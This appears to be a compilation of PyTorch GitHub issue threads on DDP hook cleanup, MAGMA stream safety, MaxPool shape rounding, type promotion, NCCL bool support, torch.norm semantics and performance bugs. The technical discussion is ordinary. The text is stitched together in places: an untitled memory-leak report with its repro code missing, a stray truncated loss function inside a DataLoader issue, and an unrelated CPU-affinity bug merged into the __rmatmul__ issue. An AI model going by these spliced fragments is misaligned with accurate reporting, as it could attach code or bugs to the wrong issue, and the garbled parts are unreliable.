title: PyTorch issue 21344
body:
@kuttas @pietern and I had a discussion on how to make DDP failure recoverable. The process involves the following steps:

```python
m = SomeModel()
dist.init_process_group()
ddp = DistributedDataParallel(m)
# got error
dist.destroy_process_group()
dist.init_process_group()
del ddp
ddp = DistributedDataParallel(m)
```

This does not work in today's DDP. Currently, to get better performance, DDP assigns the [original module](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/nn/parallel/distributed.py#L316) to the first module replica instead of creating a new one. Then, it creates a new `Reducer` to [add post hooks](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/distributed/c10d/reducer.cpp#L108-L112) to sync params. However, because every reconstructed DDP instance wraps the same original module, all their reducers will add hooks to the same set of variables. Hence, after 10 recoveries, each param (variable) in the original module will have 11 hooks introduced by 11 different reducers, where only the last one is still alive. We thought about several potential solutions:

#### Solution 1: Force Module Replication

Force DDP to create new module replicas instead of using the original module. In this way, those variables in the replicas will die together with the DDP instance. But it will make the DDP slower. Maybe make it an option?

#### Solution 2: Delete Hooks in Destructor

I feel the best way would be deleting those hooks from model variables when destructing a `Reducer`, but I didn't find a clean way to do that. The [`add_post_hook`](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/autograd/function.h#L250) function takes unique parameters, and we can get those hooks through [`post_hooks`](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/autograd/function.h#L254). Directly looping through the the hooks vector and find the target to delete seems to be too hackish.

#### Solution 3: Create New Variables (?)

Not sure if this can work. Instead of creating replica (as in Solution 1), let DDP create a new variable for every parameter in the original module. All DDP forward and backward pass will use those new variables. I think this won't work if the application only wraps part of the model using DDP, because there will be two disjoint autograd graphs (?)


@soumith @gchanan @ezyang  thoughts?
comments:
[mdlockyer]: I recently posted about this in the discussion forum [here](https://discuss.pytorch.org/t/safely-removing-a-module-from-ddp/45753). This issue actually both answers my question and confirms what I suspected was the case when either removing the module, or in this case, trying to redo the DDP wrapping. The idea of removing the hooks during destruction of the reducer would make DDP much more flexible as well. It would not only solve the situation described in this issue, but would also allow for a module to be removed from DDP with something like:

    model = ddp_model.module
    del ddp

I'm currently working on an architecture that would benefit greatly from the ability to easily remove the module from DDP. Right now there is a lot of extra complexity in my codebase just to deal with this.

---

[kuttas]: @MichaelDylan77  what are you doing to work around it currently? Re-create the inner model and transfer the parameters over?

The usage pattern you have above is similar to the use case I have. I need to be able to re-create the DDP module-wrapper with a new set of worker machines and keep training.

---

[mdlockyer]: That's exactly right. I have to re-instantiate the model and copy params. It's a pain right now. It's nice to know someone else has a use case in which they would need to extract the model from DDP 👍. It seemed like an edge case.

---

[mrshenli]: ## Trying Solution 2

#21534 seems addressed the problem but in quite a dirty way. A better solution might need to satisfy the following requirements:

1. As mentioned by @pietern, the hook deletion function should be implemented in `torch/csrc/autograd/function.h`, as it owns the data. 
2. We should not slow down existing use cases of `add_post_hook` and `post_hooks()`.

I initially thought about using an `OrderedDict` to store named hooks, as what we did for params, buffers, and children in `nn/Module.h`, but that would violate the second requirement.

~Another possibility is that, instead of using the default deleter, we create a special deleter for the hook unique ptr in DDP, e.g., `ReducerHookDeleter`, that wraps the default deleter.  The `add_post_hook` and `post_hooks()` APIs would stay the same, then we add one `delete_post_hook<DeleterType>()` API to `torch/csrc/autograd/function.h`, which loops over all post hooks, and only delete the ones with matching deleter type, i.e., `ReducerHookDeleter`. This would be slow, but is OK, as we only need this on failures, where timeout delay will dominate. Any comments?~ Should be able to directly check hook pointer type.

---

[pietern]: @MichaelDylan77 Could you give the code in #21591 a try and see if it works for you?

---

[mdlockyer]: @pietern I’ll test it out this afternoon!

---

[mdlockyer]: Everything seems to work fine on my end. No obvious issues. Memory usage looks relatively constant after removing and re-wrapping the model in DDP

---

[pietern]: @MichaelDylan77 Thanks for confirming it works for you!

---

[knagrecha]: Same issue is now coming up for FSDP - but I suspect it'll be a harder fix there due to how FSDP recursively injects itself. Can't just pull it out in this way.

title: PyTorch issue 21821
body:
#21785 showed that `at::svd()` is not stream-safe.  `at::svd()` uses `magma_dgesdd()`.

According to  http://icl.cs.utk.edu/magma/forum/viewtopic.php?f=2&t=1080, the old way of making MAGMA functions stream-safe is:

```
lock()
magmablasSetKernelStream( s1 )
magma_dgemm( ... )
unlock() 
```

The new way is using a `magma_queue_t`, but not all functions have it.  In particular `magma_dgesdd()` doesn't appear to have this parameter.


I'm not sure if either of these methods can be integrated into `pytorch`.  Meanwhile, the functions should probably raise an error if a non-default stream is detected.
comments:
[vishwakftw]: Another related thread: http://icl.cs.utk.edu/magma/forum/viewtopic.php?f=2&t=1034

---

[ngimel]: The problem is not so much with a stream safety, as with magma not setting a stream at all (e.g. the failing test is not multithreaded, so the locks in the old way that are supposed to provide stream safety under multithreaded operation are irrelevant). Rather than throwing an error on encountering non-default stream, I think it is better to synchronize default stream (on which magma would run its kernels) with the current pytorch stream. It is unfortunate that it seems to be impossible to set streams to magma kernels directly.

---

[vishwakftw]: For all of the batched kernels in MAGMA, a `magma_queue_t` object is taken as an argument, which is constructed using the current stream, cuBLAS and cuSparse handles. However, all MAGMA functions don’t support batching.

---

[ezyang]: Comments from @skrah:

> Scoped the issue and tried Natalia's suggestion, so far without success. Documentation for old-style Magma stream safety is poor. Issue seems magically fixed in some cases after port of batched_svd.

---

[skrah]: Yes, I just want to explain the "magically fixed" part as briefly as possible. I'm not working on `pytorch` this week so there may be some inaccuracies.

I could not replicate #21638 (i.e. the problematic test passed with cuda-memcheck and the stream tests re-enabled).

I'm not sure if @vishwakftw has taken extra steps to ensure stream safety in the `svd` port, but I didn't notice anything explicit.

So perhaps the memory allocation in

https://github.com/pytorch/pytorch/blob/896cd1c51071a13a465e3c54ef7c49abf4f1d0c0/aten/src/ATen/native/cuda/BatchLinearAlgebra.cu#L1347

provides some extra safety (I suspect that it performs an implicit synchronization) that makes the issue harder to trigger or indeed eliminates the issue.

---

[vishwakftw]: To echo @skrah, I didn't take care of any stream safety issues during the port, so just could have been the fact that multiple SVD calls were replaced by a single one.

title: PyTorch issue 21935
body:
The output of Maxpool has an unexpected size for some corner cases.

Repro:
Maxpool1d(kernel_size=3, stride=2, padding=0, dilation=2)
input=torch.randn(1,1,4)

If I use the L_out formula from the documentation (https://pytorch.org/docs/stable/nn.html?highlight=maxpool#torch.nn.MaxPool1d) to compute the output size, I get {1,1,0}.
However, the output generated has a size of {1, 1, 1}.

And with ONNX, the same operation results in an output of shape {1,1,0}
(https://github.com/microsoft/onnxruntime/issues/1224).

Since this case is not mentioned in the documentation, I was wondering if this is a special case that is handled separately by design (to avoid returning an output with a dim of 0), or if it is a bug.
comments:
[jignparm]: Any updates on this? It seems like the PyTorch implementation doesn't match the documentation for Maxpool1d, at least in the expected output shape computation.

---

[ailzhang]: @skrah @xmnlab can you take a look? Thanks!

---

[skrah]: Yes, it does not match. This is the implementation of the shape calculation:

```
template<typename T>
static inline T pooling_output_shape(
        T inputSize, T kernelSize, T pad, T stride, T dilation, bool ceil_mode) {
    T outputSize = ((inputSize + 2 * pad - dilation * (kernelSize - 1) - 1 + (ceil_mode ? stride - 1 : 0)) / stride + 1);
    if (pad) {
        // ensure that the last pooling starts inside the image
        // needed to avoid problems in ceil mode
        if ((outputSize - 1) * stride >= inputSize + pad)
          --outputSize;
    }
    return outputSize;
}
```

Looking at it very briefly, the most likely thing is that the right floor bracket in the documentation should exclude the `+ 1`.

But I'd need to see the original algorithm to be sure.

---

[skrah]: It must be a documentation issue:  Looking at c19af59, the original code had the `+ 1` outside of `ceil()` and `floor()`.

---

[jignparm]: >It must be a documentation issue: Looking at c19af59, the original code had the + 1 outside of ceil() and floor().

Could this be a bug in the implementation (instead of documentation)? The **+1** being outside or inside the `floor()` function should still result in same value since.
```
           floor(x + 1) = floor(x) + 1
```



For example, in issue  microsoft/onnxruntime#1224 , the  tensor size, kernel etc. variables are **i=4 ,k=3 d=2, s=2, p=0**

If the **+1** is **inside** the size computed is:

```
  outsize = floor ( (i + 2p - d*(k - 1) - 1) / s  +1 )
          = floor ( (4 + 0 - 2 *(3 - 1) - 1) / 2  +1 )
          = floor ( (4        - 2 *2    - 1) / 2  +1 )
          = floor ( (                   - 1) / 2  +1 )
          = floor (                         -0.5  +1 ) 
          = floor ( 0.5 )
          = 0
```

If the **+1** is **outside** the function then:

```
  outsize = floor ( (i + 2p - d*(k - 1) - 1) / s ) + 1 
          = floor ( (4 + 0 - 2 *(3 - 1) - 1) / 2  ) +1 
          = floor ( (4        - 2 *2    - 1) / 2  ) +1 
          = floor ( (                   - 1) / 2  ) +1 
          = floor (                         -0.5  ) +1  
          = floor (  -0.5 ) +1
          = -1 + 1
          = 0
```
In either case, the size evaluates to 0.

---

[skrah]: @jignparm Thanks, I replied too hastily. :)

So, revisiting c19af59:  Integer division in `C++` truncates toward zero, which gives unexpected results if the intermediate result in `pooling_output_shape()` before the division is negative:

```
(gdb) p -1 / 2
$12 = 0
```

Contrast with Python, which does not:

```
>>> -1 // 2
-1
```

So the question is if this was deliberate or not, perhaps @f0k can say more.  Removing the doc label.

---

[jignparm]: The implementation should allow for the output size to be 0 if the kernel is larger than input.

For example, if ** i=2, p=0, d=1, s=2, k=3**, the kernel is 1 pixel larger than the input.

The formula says output size =  **(2 - 3 )/ 2 + 1** =  **-1/2 + 1**

However, in  the C++ implementation above, because of truncation (and not flooring) we get output size = 1. In Python we get 0.

If k=4, then the C++ behavior becomes correct again, and we get output size = 0. It seems like a corner case in the C++ implementation. The  floor function seems correct to use, versus rounding towards zero.

---

[f0k]: > So the question is if this was deliberate or not, perhaps @f0k can say more.

Oh, good catch @lara-hdr. I'm quite sure I was not aware of different truncation rules between Python and C++ when I wrote this, my goal was to have the implementation match the documentation, and I relied on the existing test suite to tell me whether all edge cases were handled correctly. So this is a bug in the implementation and the test suite.

Note that only C++11 and above are guaranteed to truncate to zero, but that's [what PyTorch uses](https://github.com/pytorch/pytorch/blob/master/CMakeLists.txt#L15), so we can rely on that.

> The floor function seems correct to use, versus rounding towards zero.

Good, since we have to stick with integer arithmetic, we will need to check whether the size is negative before dividing by the stride and apply a correction.

Side question: What do we want to happen if the kernel is much larger than the input? Follow the equation in the documentation to give a negative output size, or give an output size of zero?

---

[skrah]: > What do we want to happen if the kernel is much larger than the input?

It should raise an error in `shape_check()`:

```
>>> m = MaxPool1d(kernel_size=2**31-1, stride=2, padding=0, dilation=2, ceil_mode=True)
>>> m(input)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/stefan/rel2/lib/python3.7/site-packages/torch/nn/modules/module.py", line 494, in __call__
    result = self.forward(*input, **kwargs)
  File "/home/stefan/rel2/lib/python3.7/site-packages/torch/nn/modules/pooling.py", line 75, in forward
    self.return_indices)
  File "/home/stefan/rel2/lib/python3.7/site-packages/torch/_jit_internal.py", line 129, in fn
    return if_false(*args, **kwargs)
  File "/home/stefan/rel2/lib/python3.7/site-packages/torch/nn/functional.py", line 458, in _max_pool1d
    input, kernel_size, stride, padding, dilation, ceil_mode)
RuntimeError: Given input size: (1x1x4). Calculated output size: (1x1x-2147483643). Output size is too small
```

---

[skrah]: @jignparm However, in your example with `k=4`, the shape check (which is separate code) raises:

```
>>> input = torch.randn(1,1,2)
>>> m = MaxPool1d(kernel_size=4, stride=2, padding=0, dilation=1)
>>> m(input)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/conda/miniconda3/lib/python3.7/site-packages/torch/nn/modules/module.py", line 493, in __call__
    result = self.forward(*input, **kwargs)
  File "/home/conda/miniconda3/lib/python3.7/site-packages/torch/nn/modules/pooling.py", line 75, in forward
    self.return_indices)
  File "/home/conda/miniconda3/lib/python3.7/site-packages/torch/_jit_internal.py", line 133, in fn
    return if_false(*args, **kwargs)
  File "/home/conda/miniconda3/lib/python3.7/site-packages/torch/nn/functional.py", line 461, in _max_pool1d
    input, kernel_size, stride, padding, dilation, ceil_mode)
RuntimeError: Given input size: (1x1x2). Calculated output size: (1x1x0). Output size is too small at /opt/conda/conda-bld/pytorch-nightly_1557205623994/work/aten/src/THNN/generic/SpatialDilatedMaxPooling.c:51
```

---

[f0k]: >> What do we want to happen if the kernel is much larger than the input?
>
> It should raise an error in shape_check():

Ok, for that it's enough if we return an output size of zero:
https://github.com/pytorch/pytorch/blob/31e1e63/aten/src/ATen/native/Pool.h#L64-L69

I'm asking because then we could just return 0 if the nominator is <= zero before dividing by the stride, instead of implementing [a properly flooring integer division](https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(j:1,lang:c%2B%2B,source:'%23include+%3Cstdio.h%3E%0A%23include+%3Cstdlib.h%3E%0A%23include+%3Cstring.h%3E%0A%0Aint64_t+floor_div_a(int64_t+a,+int64_t+b)%0A%7B%0A++++//+requires+stdlib+div()%0A++++ldiv_t+r+%3D+div(a,+b)%3B%0A++++if+(r.rem+!!%3D+0+%26%26+((a+%3C+0)+%5E+(b+%3C+0)))%0A++++++++r.quot--%3B%0A++++return+r.quot%3B%0A%7D%0A%0Aint64_t+floor_div_b(int64_t+a,+int64_t+b)+%7B%0A++++//+portable+implementation%0A++++int64_t+d+%3D+a+/+b%3B%0A++++int64_t+r+%3D+a+%25+b%3B%0A++++if+(r)+%7B%0A++++++++return+d+-+((a+%3C+0)+%5E+(b+%3C+0))%3B%0A++++%7D+else+%7B%0A++++++++return+d%3B%0A++++%7D%0A%7D%0A%0Aint64_t+floor_div_c(int64_t+a,+int64_t+b)+%7B%0A++++//+only+valid+for+%3E%3D+C99+/+C%2B%2B11%0A++++return+(a+%3E%3D+0)+%3F+(a+/+b)+:+-((-a)+/+b)%3B%0A%7D%0A'),l:'5',n:'0',o:'C%2B%2B+source+%231',t:'0')),k:48.35509138381202,l:'4',n:'0',o:'',s:0,t:'0'),(g:!((h:compiler,i:(compiler:g74,filters:(___0:(),b:'0',binary:'1',commentOnly:'0',demangle:'0',directives:'0',execute:'1',intel:'0',jquery:'3.2.1',length:1,libraryCode:'1',prevObject:(___0:(),length:1,prevObject:(___0:(jQuery321065988541133087141:(display:'')),length:1)),trim:'0'),lang:c%2B%2B,libs:!(),options:'-O3+-xc%2B%2B+-std%3Dc%2B%2B11',source:1),l:'5',n:'0',o:'x86-64+gcc+7.4+(Editor+%231,+Compiler+%231)+C%2B%2B',t:'0')),header:(),k:51.644908616188,l:'4',n:'0',o:'',s:0,t:'0')),l:'2',n:'0',o:'',t:'0')),version:4).

---

[f0k]: > I'm asking because then we could just return 0 if the nominator is <= zero before dividing by the stride, instead of implementing a properly flooring integer division.

Just checked what the convolution shape computation does, turns out they use a `div_rtn` function, which is the second of the implementations I linked to: https://github.com/pytorch/pytorch/blob/master/aten/src/ATen/div_rtn.h
So we should just reuse it here, and extend the test suite accordingly.

---

[jignparm]: >Side question: What do we want to happen if the kernel is much larger than the input? Follow the equation in the documentation to give a negative output size, or give an output size of zero?

From the the case of K=4 that @skrah mentioned above,  it looks like the prevailing pattern is to  raise an exception. A negative value would be confusing -- so 0 or else raising exception seems most logical.,

---

[f0k]: The exception is not raised by the shape computation code, but outside, and [the exception message includes the computed shape](https://github.com/pytorch/pytorch/blob/31e1e63/aten/src/ATen/native/Pool.h#L64-L69). Not sure if it would make a difference for anything else but the message. But I'd suggest to be consistent with the convolution, since it's the same problem.

title: PyTorch issue 22301
body:
## 🐛 Bug

Ambiguous torch.Tensor int vs float comparison

## To Reproduce
input: torch.Tensor([0]).int() < 0.5
output: tensor([0], dtype=torch.uint8)

## Expected behavior
Expected numpy-like behavior:
input: torch.Tensor([0]).int() < 0.5
output: tensor([1])

- PyTorch 1.0.1
- Ubuntu 18.04
comments:
[zou3519]: cc @nairbv: I think type promotion things might be able to fix this?

---

[nairbv]: Thanks @azakhtyamov for pointing this out.

Yes @zou3519 this is related to https://github.com/pytorch/pytorch/issues/9515. 

In this particular case the `<` operator casts the operand (0.5) to an int before performing the comparison. Essentially this means it's checking `< 0` instead of `< 0.5`.

The relevant code is in the generated LegacyTHFunctionsCPU.cpp.

Similarly `torch.IntTensor([2]) * 1.9` results in `tensor([2], dtype=torch.int32)` instead of `3`, because the 1.9 is cast to an int tensor `1`.

---

[OneMoreSecond]: The promotion from float to int Tensor is really confusing.

---

[nairbv]: I think we've only fixed for one comparison operator so-far so re-opening.
@ifedan

---

[ifedan]: Fixed in https://github.com/pytorch/pytorch/pull/26981

title: PyTorch issue 24137
body:
## 🐛 Bug

In version 1.2.0, NCCL backend doesn't support `torch.bool` datatype. Broadcasting a tensor of this type throws error "RuntimeError: Unsupported data type for NCCL process group".

## To Reproduce

Steps to reproduce the behavior:

Create a file test.py with following contents:
```py
import torch
import argparse
from torch import distributed as dist


parser = argparse.ArgumentParser()
parser.add_argument("--local_rank", type=int)

args = parser.parse_args()

torch.distributed.init_process_group("nccl")

local_rank = args.local_rank

device = torch.device(local_rank)

if local_rank == 0:
    element = False
else:
    element = True


def broadcast_scalar(scalar, src=0, device="cpu"):
    scalar_tensor = torch.tensor(scalar).to(device)
    with torch.no_grad():
        scalar_tensor = dist.broadcast(scalar_tensor, src)
    return scalar_tensor.item()


broadcast_scalar(element, src=0, device=device)
```

Run it with following command:
`python -u -m torch.distributed.launch --nproc_per_node 2 test.py`

This has been tested on 2 GPUs.

## Expected behavior

NCCL backend should support the bool datatype. 
Current workaround fix: Change the datatype to int by doing `.long()` before broadcasting.
## Environment

```
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.1 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: version 3.10.2

Python version: 3.6
Is CUDA available: Yes

GPU 1: Quadro GP100

Nvidia driver version: 410.79
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] numpy==1.16.3
[pip] torch==1.2.0
[pip] torchtext==0.3.1
[pip] torchvision==0.2.2
[conda] torch                     1.2.0                     <pip>
[conda] torchtext                 0.3.1                     <pip>
[conda] torchvision               0.2.2                     <pip>
```
comments:
[williamFalcon]: And you get a warning saying .uint8 isn't supported so we should switch to .bool... but then NCCL doesn't support it.

---

[soumith]: cc: @mrshenli @pietern we should fix this with upcast + transfer + downcast

---

[rohan-varma]: @soumith, I'm working on this bug. Could you explain what you mean by "upcast + transfer + downcast"? It appears that the error is coming from here: https://github.com/pytorch/pytorch/blob/master/torch/lib/c10d/ProcessGroupNCCL.cpp#L45-L60, and seems to happen because `ncclDataType_t` doesn't have a bool type

---

[soumith]: @rohan-varma i mean that we should cast the buffer from bool to uint8, then all reduce, then cast it on the other side to bool again

---

[pietern]: Things to keep in mind:
* Can only use `uint8_t` with up to 255 processes in the process group. We rely on every process contributing an integer equal to 1 if the equivalent boolean entry is set. With 256 processes we would overflow an 8-bit unsigned integer and get the wrong result. The change should either 1) assert that the process group size is small enough, or implement a separate code path that uses a 16-bit unsigned integer for larger process groups.
* Semantics of the different reduction ops (each of which _could_ use SUM as the underlying reduction):
  * `ReduceOp.SUM` -- boolean OR, so the boolean output is `output != 0`
  * `ReduceOp.PRODUCT` -- boolean AND, so the boolean output is `output == pg->size`
  * `ReduceOp.MIN` -- boolean AND (see above)
  * `ReduceOp.MAX` -- boolean OR (see above)

---

[ekmb]: @rohan-varma Is it fixed?

---

[mrcslws]: I would be really happy to see this fixed. We have lots of modules that store masks in buffers. Because of this issue, these modules are forced to use `float16` or `float32` mask buffers rather than `bool` buffers.

---

[sajadn]: On pytorch 1.5.1 I still have problem with this. Is it going to be fixed?

---

[rohan-varma]: Hi @sajadn, this was landed ~1 month ago so it should be part of the next release, PT 1.7. Until then, you can try out the nightly build (see instructions at https://pytorch.org/) where this is fixed.

Calling `torch.tensor` on a Python `list` of `np.float32` objects leaks memory.

## To Reproduce

# 1416
# 2884
# 3940
# 4996
# 6316
# 7372
# 8428
# 9484
# 10804
# 11860
```

## Expected behavior

The number being printed (memory usage) should be more or less constant.

## Environment

 - PyTorch Version: 1.0.0, 1.1.0, 1.2.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.6.8

## Additional context

On pytorch==0.4.1, `torch.tensor(a)` throws:
```
RuntimeError: Could not infer dtype of numpy.float32
```

Also, this might be the underlying bug in [#17499](https://github.com/pytorch/pytorch/issues/17499).

### How this shows up in real code

This shows up in real code if you have a 1d array in a dataset:

```
class Dataset:
    def __init__(self, X, y):
        self.X = x; self.y = y
    
    def __getitem__(self, i):
        return self.X[i], self.y[i] # <-- self.y[i] is a np.float32
    
    def __len__(self):

```

`self.y[i]` is a `np.float32`, and in 1.2.0, a batch of these get wrapped in a `list` by `_MapDatasetFetcher`, and `default_collate` calls `torch.as_tensor` on it.

title: PyTorch issue 24802
body:
`torch.norm` currently have the following inconsistent behavior where for matrix inputs and `ord` is a numerical value, **vector** norm is computed instead:
```
            =====  ============================  ==========================
            ord    matrix norm                   vector norm
            =====  ============================  ==========================
            None   Frobenius norm                2-norm
            'fro'  Frobenius norm                --
            'nuc'  nuclear norm                  --
            Other  as vec norm when dim is None  sum(abs(x)**ord)**(1./ord)
            =====  ============================  ==========================
```
(Even though the last row reads `when dim is None`, same behavior happens when `dim` is a 2-tuple).


However, the matrix Lpq norms are useful. And users are justified in expecting that `mat.norm(2)` computes the L2 norm (max e-value) since `mat.norm('fro')` computes the matrix Frobenius norm. If we follow the [NumPy interface](https://docs.scipy.org/doc/numpy/reference/generated/numpy.linalg.norm.html), the following behavior should be less surprising and error prune:

```

    =====  ============================  ==========================
    ord    norm for matrices             norm for vectors
    =====  ============================  ==========================
    None   Frobenius norm                2-norm
    'fro'  Frobenius norm                --
    'nuc'  nuclear norm                  --
    inf    max(sum(abs(x), axis=1))      max(abs(x))
    -inf   min(sum(abs(x), axis=1))      min(abs(x))
    0      --                            sum(x != 0)
    1      max(sum(abs(x), axis=0))      as below
    -1     min(sum(abs(x), axis=0))      as below
    2      2-norm (largest sing. value)  as below
    -2     smallest singular value       as below
    other  --                            sum(abs(x)**ord)**(1./ord)
    =====  ============================  ==========================
```

cc @ezyang @gchanan @zou3519 @SsnL @vishwakftw @jianyuh
comments:
[vadimkantorov]: Related about the spectral matrix norm: https://github.com/pytorch/pytorch/issues/12760

---

[vishwakftw]: How does NumPy handle batching?

For instance, a 4 x 3 matrix can also be interpreted as 4 size-3 vectors.

---

[vishwakftw]: So, I did some trials and this is what I found:
- If inputs are 2-D and axis is not specified, then the input is considered to be a matrix
- If inputs are 2-D and an axis is specified, then the input is considered to be a batch of vectors whose corresponding norms are output
- If inputs are > 2-D, then an axis argument is mandatory when `ord` is not `None`. Furthermore, you will have to provide one axis for vector inputs, and 2 axes for matrix inputs.

---

[ezyang]: It does seem like this may merit a BC-breaking change. Some things we should check before doing so: (1) when was this consistency introduced, (2) is the inconsistent behavior tested for in our test suite, or is this actually totally untested.

This seems like a case where we can easily give a deprecation warning, since the forward compatible way of batching (specify an axis explicitly) works today,

---

[VitalyFedyunin]: We need to separate 'needs discussion' label from the triage process.

---

[ailzhang]: ~Any objections if we fix the documentation first for 1.3? Now it says we give matrix norm in some cases, which is not true.~
[Edit: ] Nvm the documentation matches our behavior which "redefines" matrices norm to be same as vec norm for non-fro and non-nuc norms. https://pytorch.org/docs/master/torch.html#torch.norm 
I'd strong prefer a BC breaking change. Assigning myself for now, will try to find some time to fix later if no one beats me to it.

---

[kurtamohler]: @ailzhang , are you still planning on doing this? If not, I would be happy to take over.

---

[ailzhang]: Hey @kurtamohler , feel free to take it over! Please let us know if you need any help! Thanks!

---

[kurtamohler]: Cool, thanks!

---

[kurtamohler]: I don't fully understand what numpy's norm is supposed to do when `ord=2` in the matrix norm case. The documentation says `2-norm (largest sing. value)`, which is unclear to me. "largest sing. value" would seem to just mean `max(x, axis=(0,1))`, but that's not the result I get:
```
>>> numpy.linalg.norm(numpy.array([[1,2,3],[4,5,6]]), ord=2, axis=(0,1))
9.50803200069572
```

[vishwakftw]: Largest singular value is the largest value of the diagonal elements of S, where X = USV^{T} (SVD).

---

[kurtamohler]: Got it, thanks @vishwakftw!

[kurtamohler]: I think I might need to introduce a new function `at::matrix_norm`. At first, my approach was just to change `at::norm` to calculate a matrix norm if `dim.size() == 2`. But the problem is that `at::frobenius_norm` calls `at::norm`, expecting it to act like a vector norm even if `dim.size() > 1`.

An alternative solution could be to add an optional bool argument to `at::norm` to allow the caller to force the vector norm to be used, no mater what `dim.size()` is, but to me it seems less confusing to just make a new function. If anyone sees an issue with that, please let me know!

[mruberry]: In the near-ish future we'll have torch.linalg.norm analogous to NumPy's numpy.linalg.norm (https://numpy.org/doc/1.18/reference/generated/numpy.linalg.norm.html?highlight=norm#numpy.linalg.norm) and want to deprecate this function. Once we have torch.linalg.norm like that, would you still want to add a separate function?

---

title: PyTorch issue 25010
body:
## 🐛 Bug
There seems to be an issue with CPU utilization when using a DataLoader with pin_memory=True and num_workers > 0. 

I revisited some old code that had `pin_memory=True` and two workers that weren't doing all that much. It pinned all of my CPU cores at or near 100%, with 40-50% of the usage in the kernel.  I've had performance issues with pinned memory in the past, but never to this level. Indeed, I cannot reproduce the issue going back to some older environments with 0.4 or 1.0.1. But on 3 machines w/ PyTorch 1.1 and 1.2 I can easily reproduce by running the MNIST main.py from the current examples master.

If I set either num_workers=0 or pin_memory=False the issue goes away and I'm left with the expected one core and change of usage for MNIST (or two cores and change for my original case). 

## To Reproduce

1. Run `main.py` from the MNIST example on master pytorch/examples repository.

## Expected behavior

For MNIST, with 1 worker I expect roughly 1 core's worth of CPU utilization plus some overhead. It consumes 50-100% of all cores on systems with 8-14 physical (16-28 logical) cores. A large % of the CPU usage is in the kernel, appears to be spinning/yielding, possibly due to contention. 

## Environment

I've reproduced on 3 machines.

 - PyTorch Version (e.g., 1.0): 1.1 and 1.2 (no issue on an older 1.0.1 and 0.4.1 environment on one of the machines)
 - OS (e.g., Linux): two Ubuntu 18.04 machines, one Ubuntu 16.04 machine
 - How you installed PyTorch (`conda`, `pip`, source): All conda installs
 - Python version: 3.7.3 and 3.6.8
 - CUDA/cuDNN version: Cuda 10 and CUDNN 7.5.1 and 7.6.2
 - GPU models and configuration: dual Titan RTX one one machine, dual Titan Xp and 1080Ti on other two

I've seen at least one very likely, and other potential threads in discussion forum that are likely this issue. 

This one has an htop screenshot from me, and another user:
https://discuss.pytorch.org/t/cpu-usage-extremely-high/52172/5

    import torch
    import torch.nn as nn
    import torch.nn.functional as F

    def loss_func(p, y, ignore_index=255, num_classes=19):

title: PyTorch issue 26333
body:
Currently if the the argument of `__rmatmul__` is not a Tensor, PyTorch throws `*** TypeError: matmul(): argument 'other' (position 1) must be Tensor, not Vec`

Python data model asks that it return `NotImplemented` in such case. This allows interpreter to dispatch op to the proper implementation.
(ie see https://docs.python.org/3/library/numbers.html#implementing-the-arithmetic-operations)

Current behavior makes it hard to implement custom types. IE
```
class FactoredMatrix:
  def __init__(self, mat):
    self.mat = mat
  def __matmul__(self, other):
    return 0
  def __rmatmul__(self, other):
    return 1
x = torch.ones((2,2))
print(FactoredMatrix(x) @ x)  # works
print(x @ FactoredMatrix(x))  # fails
```

## 🐛 Bug

The affinity of a worker process is reset after `torch.randperm` is called in the worker process.

## To Reproduce

Steps to reproduce the behavior:

1. Change the worker process affinity in the `worker_init_fn` function.
1. Call `torch.randperm` in the `__iter__` method of an IterableDataser.
1. Now the worker process affinity is back to the original one.

The following code sample reproduce the problem :

```
import os
import torch
import torch.utils.data

class TestDataset(torch.utils.data.IterableDataset):
    
    def __iter__(self):
        assert(len(os.sched_getaffinity(0)) == 1)
        torch.randperm(1)
        assert(len(os.sched_getaffinity(0)) == 1)
        return range(1)

def worker_init_fn(_):
    os.sched_setaffinity(0, list(os.sched_getaffinity(0))[0:1])
        
if __name__ == '__main__':
    assert(len(os.sched_getaffinity(0)) > 1)
    dataset = TestDataset()
    dataloader = torch.utils.data.DataLoader(dataset, num_workers=1, worker_init_fn=worker_init_fn)
    for _ in dataloader:
        pass
```

I except that a call to `torch.randperm` inside a worker process doesn't touch the process affinity.

title: PyTorch issue 29352
body:
From what I observe when working on https://github.com/pytorch/pytorch/pull/29233, cusparse handle is managed the same way as cublas handle, therefore not thread-safe.

https://github.com/pytorch/pytorch/pull/29233 makes the handle pool mechanism which was originally used for cudnn generic, so it would also be able to use to manage cusparse handle. We should migrate the management of cusparse handle to that approach.

See also: https://github.com/pytorch/pytorch/issues/6962

title: PyTorch issue 31690
body:
## 🐛 Bug

A `nn.ConvTranspose2d` can be up to two orders of magnitude slower when the `output_padding` option is set to a nonzero value then when it isn't.

## To Reproduce

```
class Test(nn.Module):
    def __init__(self, output_padding):
        super().__init__()
        
        self.c1 = nn.ConvTranspose2d(128, 64, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
        self.c2 = nn.ConvTranspose2d(64, 32, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
        self.c3 = nn.ConvTranspose2d(32, 3, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
    def forward(self, x):
        x = self.c1(x)
        x = nn.functional.relu(x)
        x = self.c2(x)
        x = nn.functional.relu(x)
        x = self.c3(x)
        x = nn.functional.relu(x)
        return x

def test(output_padding):
    network = Test(output_padding=output_padding).cuda()
    x = torch.rand((1028, 128, 6, 6)).cuda()


    for i in range(5):
        start = time.time()
        for i in range(10):
            network(x)
        print((time.time() - start) / 10)

test((0, 0))
test((1, 1))
```

On my V100 machine, I get timings of about 0.0004s per forward pass with `output_padding=(0, 0)` and about .05s with `output_padding=(1, 1)`.

## Expected behavior

